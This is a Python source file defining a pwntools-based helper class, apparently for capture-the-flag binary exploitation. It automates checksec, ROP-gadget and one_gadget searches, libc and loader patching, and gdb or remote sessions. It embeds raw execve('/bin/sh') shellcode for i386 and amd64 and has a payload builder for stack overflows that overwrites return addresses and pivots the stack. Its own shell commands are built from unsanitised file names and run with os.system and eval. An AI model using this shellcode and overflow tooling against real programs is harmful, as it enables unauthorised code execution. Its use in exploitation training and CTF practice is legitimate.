from pwn import *

from pwnlib.util.packing import p8, p32, p64

import os

class BeginPwn:
	
	def __init__(self, Binary_Name, Breakpoint_List=[],Additional_Script=[], argv_List=[], libc="", ld=""):
		self.path = str(os.popen("pwd").read())[:-1] + '/'
		if (Binary_Name[0:2] == "./"):
			self.Binary_Name = Binary_Name[2:]
		else:
			self.Binary_Name = Binary_Name
		if len(self.Binary_Name) <= 0:
			raise ImportError("Please provide an ELF file!")

		if os.path.isfile(self.path+self.Binary_Name):
			if str(os.popen('test -d ' + self.path +'original/ && echo "1" || echo "0"').read())[:-1]=="0":
				os.system("mkdir original")
				os.system("cp "+ self.Binary_Name + " original/"+self.Binary_Name)
			elif os.path.isfile(self.path + "original/" + self.Binary_Name):
				os.system("rm "+ self.Binary_Name)
				os.system("cp "+ "original/"+self.Binary_Name + " " + self.Binary_Name )
			else:
				os.system("cp "+ self.Binary_Name + " original/"+self.Binary_Name)
		else:
			if str(os.popen('test -d ' + self.path +'original/ && echo "1" || echo "0"').read())[:-1]=="0":
				raise ImportError("ELF file does not exist, please check again!")
			elif os.path.isfile(self.path + "original/" + self.Binary_Name):
				os.system("cp "+ "original/"+self.Binary_Name + " " + self.Binary_Name )

		os.system("chmod u+x "+ self.Binary_Name)
		
		self.Breakpoint_List = Breakpoint_List
		self.Additional_Script = Additional_Script
		self.argv_List = argv_List
		
		if open(self.Binary_Name, "rb").read(5)[-1] == 2:
			self.libc = '/lib/x86_64-linux-gnu/libc.so.6'
			context(arch = 'amd64', os = 'linux')
		else:
			self.libc = '/lib/i386-linux-gnu/libc.so.6'
			context(arch = 'i386', os = 'linux')
		if libc != "":
			if "libc" in libc:
				self.libc = libc
				os.system("chmod u+x "+ self.libc)
			else:
				raise ImportError("Wrong libc!")
		if self.libc == '/lib/x86_64-linux-gnu/libc.so.6' or self.libc == '/lib/i386-linux-gnu/libc.so.6':
			os.system("cp " + self.libc + " libc.so.6")
   			
		if (ld == ""):
			self.ld = str(os.popen("patchelf --print-interpreter "+ self.Binary_Name).read())[:-1]
		else:
			if "ld" in ld:
				self.ld = ld
				os.system("chmod u+x "+ self.ld)
			else:
				raise ImportError("Wrong ld!")

		self.status = "None"
		self.argv = ""
		self.our_scripts = ""
		self.our_argv = ""
		self.our_env = ""
		self.handle = 0
		BeginPwn._check_sec_and_ROP_and_gadget(self)
		return

	def _get_info(self,info):
		f = open("checksec_"+self.Binary_Name+".txt","w")

		_print_info = lambda i: info[i][:-1] + " " * (40-len(info[i][:-1]))
		f.write(_print_info(1) + ("32-bit." if "32" in info[1] else "64-bit.") +'\n')
		f.write(_print_info(2)  + ("No GOT table overwrite." if "Full RELRO" in info[2] else "GOT table overwrite, maybe.") + '\n')
		f.write(_print_info(3)  + ("No stack overflow." if "Canary found" in info[3] else "Stack overflow, maybe.") + '\n')
		f.write(_print_info(4)  + ("No stack execution." if "NX enabled" in info[4] else "STACK CAN BE EXECUTION!") + '\n')
		f.write(_print_info(5)  + ("Binary code has random address." if "PIE enabled" in info[5] else "Binary code has fixed address, nice.") + '\n')
		if "RWX" in info[6]:
			f.write(_print_info(6) + ("SHELLCODE CAN BE ADDED!" if "Has RWX segment" in info[6] else "")  + '\n')
		f.close()
		return

	def _check_sec_and_ROP_and_gadget(self):
		if not os.path.isfile("checksec_" + self.Binary_Name + ".txt"):	
			info = os.popen("python -c \"from pwn import *; print(ELF('" + self.Binary_Name +"'))\"").readlines()
			BeginPwn._get_info(self,info)
		if not os.path.isfile("ROP_of_" + self.Binary_Name + ".txt"):	
			os.system( "ROPgadget --binary "+ self.Binary_Name + " > ROP_of_" + self.Binary_Name + ".txt")
		if not os.path.isfile("one_gadget_libc.txt"):	
			os.system( "one_gadget -l 5 " + self.libc + " > one_gadget_libc.txt" )
		pass

	def get_ROP(self,registers=[], libc = False):
		if len(self.Binary_Name) == 0:
			raise ImportError("Can not get ROP because there is no binary imported!")
		Binary_Name = self.Binary_Name
		if (libc == True):
			Binary_Name = self.libc
		for register in registers:
			os.system( "ROPgadget --binary "+ Binary_Name + "| grep \"pop " + register +"\" | grep \"ret\" + > ROP_of_" + Binary_Name + ".txt")
		return
	
	def __str__(self):
		print("Binary_Name:        " + (format(self.Binary_Name) if not self.Binary_Name=="" else "None"))
		print("Breakpoint_List:    " + (format(self.Breakpoint_List) if len(self.Breakpoint_List) else "None"))
		print("Additional_Script:  " + (format(self.Additional_Script) if len(self.Additional_Script) else "None"))
		print("Argv_List:          " + (format(self.argv_List) if len(self.argv_List) else "None"))
		print("Argv:               " + (format(self.argv) if self.argv!="" else "None"))
		print("Libc:               " + self.libc)
		print("ld:                 " + self.ld)
		print("Status:             " + format(self.status), end = "")
		return ""

	def _set_breakpoint(self):
		script = ""
		for b_offset in self.Breakpoint_List:
			if type(b_offset) is int:
				script += "b *" + hex(b_offset) + "\n"
			else:
				script += "b *" + b_offset + "\n"
		return script
	
	def _set_non_number_script(self):
		script = ""
		for command in self.Additional_Script:
			script += command + "\n"
		return script
	
	def _set_argv(self):
		script = ""
		return script

	def _set_libc(self):
		if self.libc =='/lib/x86_64-linux-gnu/libc.so.6' or self.libc =='/lib/i386-linux-gnu/libc.so.6':
			return {}
		else:
			return {"LD_PRELOAD" : "./" + self.libc}
	
	def _set_ld(self):
		os.system("patchelf --set-interpreter "+ self.ld + " " + self.Binary_Name)
		return
	
	def change(self,Binary_Name="",Breakpoint_List=[],Additional_Script=[], argv_List=[], libc="", ld=""):
		if (Binary_Name!=""):
			self.Binary_Name = Binary_Name
		if len(Breakpoint_List):
			self.Breakpoint_List = Breakpoint_List
		if len(Additional_Script):
			self.Additional_Script = Additional_Script
		if len(argv_List):
			self.argv_List = argv_List
		return

	def get_shellcode(self, length = "long"):
		if context.arch == "i386":
			if length == "long":
				return asm(pwnlib.shellcraft.i386.linux.sh())
			elif length == "short":
				return b"\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
			else:
				raise TypeError("Invalid length for get_shellcode")
		elif context.arch == "amd64":	
			if length == "long":
				return asm(pwnlib.shellcraft.amd64.linux.sh())
			elif length == "short":
				return b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
			else:
				raise TypeError("Invalid length for get_shellcode")
		return b""

	def convert_to_bytes(x, is_int = 0, ERROR_str = ""):
		if type(x) is int:
			return p64(x) if context.arch == "amd64" else p32(x)
		elif type(x) is bytes:
			return x + ((b'\x00'*(8-len(x)) if context.arch == "amd64" else x + b'\x00'*(4-len(x))) if is_int==1 else b"") 
		elif type(x) is str:
			x = x.encode("latin-1")
			return x + ((b'\x00'*(8-len(x)) if context.arch == "amd64" else x + b'\x00'*(4-len(x))) if is_int==1 else b"") 
		else:
			raise TypeError(ERROR_str + ("\n" if ERROR_str != "" else "") + "Not a bytes or a string or an int!")
		return

	def overflow(func_type = "",rip = None, local_var = {}, start = None, special_filter = {},fill_char=b"\x00",  rbp = None):
		fill = b""
		x = str(start).replace(" ","")
		find_id = x.find("+")
		if (x if find_id == -1 else x[:find_id]) not in local_var:
			raise IndexError("Wrong starting point!")
		start_id = local_var[ (x if find_id == -1 else x[:find_id]) ] + (eval(x[find_id+1:]) if find_id != -1 else 0)
		
		fill_arr = [fill_char for _ in range(0-start_id)]

		for key in special_filter:
			x = str(key).replace(" ","")
			find_id = x.find("+")
			if (x if find_id == -1 else x[:find_id]) not in local_var:
				raise ValueError("Wrong in special filter!")
			_id = local_var[ (x if find_id == -1 else x[:find_id]) ] + (eval(x[find_id+1:]) if find_id != -1 else 0)
			_id = _id - start_id
			if _id < 0:
				continue
			_val = BeginPwn.convert_to_bytes(special_filter[key],1)
			for i in range(len(_val)):
				fill_arr[_id+i] = p8(_val[i])

		for b in fill_arr:
			fill += b

		if func_type == "return address":
			if rip == None:
				raise ImportError("Please input return address!")
			else:
				if rbp != None:
					return fill + BeginPwn.convert_to_bytes(rbp,1) + BeginPwn.convert_to_bytes(rip,1)
				return fill + fill_char*(8 if context.arch == "amd64" else 4) + BeginPwn.convert_to_bytes(rip,1)				
		elif func_type == "return address pivot":
			if rip == None:
				raise ImportError("Please input return or pivot address!")
			else:
				_byte_pivot = BeginPwn.convert_to_bytes(rip,1)[0]
				_byte_pivot = p8(_byte_pivot) if type(_byte_pivot) is int else _byte_pivot
				if rbp != None:
					return fill + BeginPwn.convert_to_bytes(rbp,1) + _byte_pivot
				return fill + fill_char*(8 if context.arch == "amd64" else 4) + _byte_pivot
		elif func_type == "stack pivot":
			if rbp == None:
				raise ImportError("Please input rbp/ebp for stack pivot!")
			_byte_pivot = BeginPwn.convert_to_bytes(rbp,1)[0]
			_byte_pivot = p8(_byte_pivot) if type(_byte_pivot) is int else _byte_pivot
			return fill + _byte_pivot
		else:
			raise NameError("Please input a valid function name!")
		return

	def pre_process(self):
		self.our_scripts = BeginPwn._set_breakpoint(self) + BeginPwn._set_non_number_script(self)
		self.our_argv = BeginPwn._set_argv(self)
		self.our_env = BeginPwn._set_libc(self)
		BeginPwn._set_ld(self)
		return
	
	def run_elf(self, target = None):
		string = ""
		if (self.status != "process"):
			string += "gdb." 
		string += self.status + "("
		if (target == None):
			string += "\"./\"+self.Binary_Name"
		else:
			string += "target"
		if (self.status != "process"):
			string += ",gdbscript = self.our_scripts"
		if len(self.our_env) and self.status!="attach":
			string += ", env = " + str(self.our_env)
		if len(self.our_argv):
			string += ", argv = self.our_argv"
		string += ")"
		return string
	
	def process(self):
		if (self.Binary_Name == ""):
			return
		self.status = "process"
		BeginPwn.pre_process(self)
		self.handle = eval(BeginPwn.run_elf(self))
		return self.handle

	def attach(self):
		if (self.Binary_Name == ""):
			return
		self.handle = BeginPwn.process(self)
		self.status = "attach"
		eval(BeginPwn.run_elf(self,self.handle))
		return self.handle
	
	def debug(self):
		if (self.Binary_Name == ""):
			return
		self.status = "debug"
		BeginPwn.pre_process(self)
		self.handle = eval(BeginPwn.run_elf(self))
		return self.handle

	def nc(self, IP_Addr, Port):
		if (self.Binary_Name == ""):
			return
		self.status = "netcat"
		self.handle = remote(IP_Addr,Port)
		return self.handle


	def get_handle(self):
		if self.handle == 0:
			raise ValueError("No handle, please run ELF file first!")
		return self.handle

	def interactive(self):
		if self.handle == 0:
			raise ValueError("No handle, please run ELF file first!")
		self.handle.interactive()
		pass
		
	def check_payload(payload):
		if (b"\x0a" or b" ") in payload:
			log.info("Becareful, you have an endl or a space in you payload!")
		return

	def send(self, line=0, payload="", func_type = "", size = -1, prev = ""):
		target = self.handle
		payload = BeginPwn.convert_to_bytes(payload, 0, "Invalid payload for send!")
		if size!=-1:
			payload = payload + b"\x00"*(size - len(payload) - (len(target.newline) if line == 1 else 0))
		BeginPwn.check_payload(payload)
		payload = payload + (target.newline if line == 1 else b"")
		if func_type =="":
			target.send(payload)
		elif func_type == "after":
			target.sendafter(prev,payload)
		else:
			raise NameError("Please input a valid function name for send!")
		return payload


	def _check_param(func_type, parameter):
		if func_type in ["line", "all"]:
			return
		elif func_type in ["contains","end","start"]:
			if type(parameter) is not tuple:
				raise TypeError("Your parameter is not a tuple, please check again!")
			if len(parameter) <= 0:
				raise ValueError("Your tuple is empty, please check again!")
		elif func_type in ["n","lines"]:
			if type(parameter) is not int:
				raise TypeError("Your parameter is not an int, please check again!")
			if parameter <= 0:
				raise ValueError("Your int is equal to 0, please check again!")
		elif func_type == "until":
			if type(parameter) is not bytes and type(parameter) is not str:
				raise TypeError("Your parameter is not a bytes or str, please check again!")
			if len(parameter) <= 0:
				raise ValueError("You parameter for \"until\" is empty, please check again!")
		return

	def recv(self, decode = 0, func_type = "", parameter = None):
		target = self.handle
		recv_data = b""
		BeginPwn._check_param(func_type,parameter)
		if func_type == "contains":
			recv_data = target.recvline_contains(parameter)
		elif func_type == "end":
			recv_data = target.recvline_endswith(parameter)
		elif func_type == "start":
			recv_data = target.recvline_startswith(parameter)
		elif func_type == "line":
			recv_data= target.recvline()
		elif func_type == "until":
			recv_data = target.recvuntil(parameter.encode("latin-1") if type(parameter) is str else parameter)
		elif func_type == "all":
			recv_data = target.recvall()
		elif func_type == "n":
			recv_data = target.recvn(parameter)
		elif func_type == "lines":
			recv_data = target.recvlines(parameter)
		else:
			raise ImportError("Please input a valid recv function!")
		if decode == 1:
			return recv_data.decode("latin-1")
		return recv_data



#My_Pwn = BeginPwn("chall", Breakpoint_List=["main"],libc="libc.2.23.so",ld="ld-2.23.so")

#print(My_Pwn)

#target = My_Pwn.attach()

